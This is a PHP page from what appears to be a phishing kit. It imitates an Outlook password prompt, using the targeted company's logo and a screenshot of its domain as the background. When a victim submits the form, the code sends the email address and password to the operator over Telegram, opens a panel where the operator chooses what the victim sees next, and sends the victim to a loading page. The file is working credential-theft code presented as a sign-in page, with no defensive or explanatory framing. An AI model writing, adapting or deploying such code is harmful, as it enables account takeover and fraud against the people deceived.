<?php
// password.php — Company logo + domain background screenshot
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid        = $_SESSION['visitor_id'] ?? session_id();
// ── Block check: redirect immediately if visitor is blocked ──
if (!empty($sid)) {
    $__state = get_state($sid);
    if (!empty($__state['blocked'])) {
        header('Location: blocked.php');
        exit;
    }
}

$email      = $_SESSION['email'];
$state      = get_state($sid);
$error      = '';
$show_error = ($state['page'] === 'pw_error');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pw = $_POST['password'] ?? '';
    if ($pw === '') {
        $error = 'Enter the password for ' . htmlspecialchars($email);
    } else {
        set_state($sid, ['page' => 'loading']);
        $s = get_state($sid);
        tg_send(
            "🔐 <b>PASSWORD SUBMITTED — OUTLOOK</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔑 Password: <code>{$pw}</code>\n\n" .
    
            "👇 <b>Choose what to show:</b>"
        );
        tg_panel($sid);
        header('Location: loading.php');
        exit;
    }
}

// page_open() calls domain_bg_style() internally — applies screenshot bg automatically
page_open('Enter password', false);
?>

<div class="card">

  <?= company_logo_html() ?>

  <?= back_email($email) ?>

  <h1 class="card-title">Enter password</h1>

  <form method="POST" id="pwForm" novalidate>
    <div class="ms-field" style="position:relative">
      <input type="password" name="password" id="pwInput"
             placeholder="Password"
             class="<?= ($error || $show_error) ? 'err' : '' ?>"
             autocomplete="current-password"
             style="padding-right:40px" />
      <button type="button" id="eyeBtn"
              style="position:absolute;right:0;top:50%;transform:translateY(-50%);
                     background:none;border:none;cursor:pointer;padding:4px;color:#666">
        <svg id="eyeShow" width="18" height="18" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="1.5" stroke-linecap="round">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
        <svg id="eyeHide" width="18" height="18" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
             style="display:none">
          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
          <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
          <line x1="1" y1="1" x2="23" y2="23"/>
        </svg>
      </button>
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= err_icon() ?> <?= $error ?></div>
    <?php elseif ($show_error): ?>
      <div class="err-text">
        <?= err_icon() ?>
        Your account or password is incorrect. If you don't remember your password,
        <a href="#" class="ms-link" style="margin:0;font-size:13px"></a>.
      </div>
    <?php else: ?>
      <div class="err-text" id="pwErr"></div>
    <?php endif; ?>

    <a href="#" class="ms-link">Forgot my password</a>

    <div class="btn-row-ms">
      <button type="submit" class="btn-ms">Sign in</button>
    </div>
  </form>
</div>

<?php page_close(); ?>